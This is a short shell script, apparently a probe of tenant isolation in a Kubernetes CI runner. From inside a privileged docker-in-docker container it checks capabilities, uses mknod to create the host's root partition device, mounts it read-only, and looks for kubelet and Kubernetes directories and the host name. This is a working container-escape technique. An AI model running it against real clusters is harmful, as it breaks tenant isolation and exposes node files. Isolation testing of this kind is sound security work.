#!/bin/sh
#
#   kubectl cp scripts/diagnose.sh tenant-a/ci-runner-runc:/tmp/diagnose.sh -c dind
#   kubectl -n tenant-a exec -it ci-runner-runc -c dind -- sh /tmp/diagnose.sh

echo "=== whoami / caps ==="
id
echo "CAP check (need CAP_SYS_ADMIN for mount):"
grep CapEff /proc/self/status
echo ""

echo "=== /proc/partitions ==="
cat /proc/partitions
echo ""

echo "=== existing /dev block nodes ==="
ls -l /dev/nvme* /dev/xvd* /dev/sd* /dev/vd* 2>/dev/null || echo "(none of the usual names exist)"
echo ""

echo "=== try to create + mount nvme0n1p1 (the likely root) ==="
# major/minor from /proc/partitions
line=$(awk '$4=="nvme0n1p1"{print $1, $2}' /proc/partitions)
echo "nvme0n1p1 major/minor: $line"
major=$(echo "$line" | awk '{print $1}')
minor=$(echo "$line" | awk '{print $2}')

if [ ! -b /dev/nvme0n1p1 ]; then
  echo "node missing, running: mknod /dev/nvme0n1p1 b $major $minor"
  mknod /dev/nvme0n1p1 b "$major" "$minor"
  echo "mknod exit code: $?"
else
  echo "node already exists"
fi
ls -l /dev/nvme0n1p1 2>/dev/null

mkdir -p /hostfs
echo "running: mount -o ro /dev/nvme0n1p1 /hostfs"
mount -o ro /dev/nvme0n1p1 /hostfs
echo "mount exit code: $?"
echo ""

echo "=== what's on it? ==="
ls /hostfs 2>/dev/null
echo ""
echo "kubelet dir present?"
ls -d /hostfs/var/lib/kubelet 2>/dev/null && echo "YES" || echo "no"
echo "kubernetes dir present?"
ls -d /hostfs/etc/kubernetes 2>/dev/null && echo "YES" || echo "no"
echo "hostname on mounted fs:"
cat /hostfs/etc/hostname 2>/dev/null
echo ""

echo "=== filesystem type of partitions (helps identify root) ==="
for p in nvme0n1p1 nvme0n1p14 nvme0n1p15 nvme0n1p16; do
  [ -b /dev/$p ] && printf "%s: " "$p" && (blkid /dev/$p 2>/dev/null || echo "blkid unavailable")
done

umount /hostfs 2>/dev/null
echo ""
echo "=== done ==="

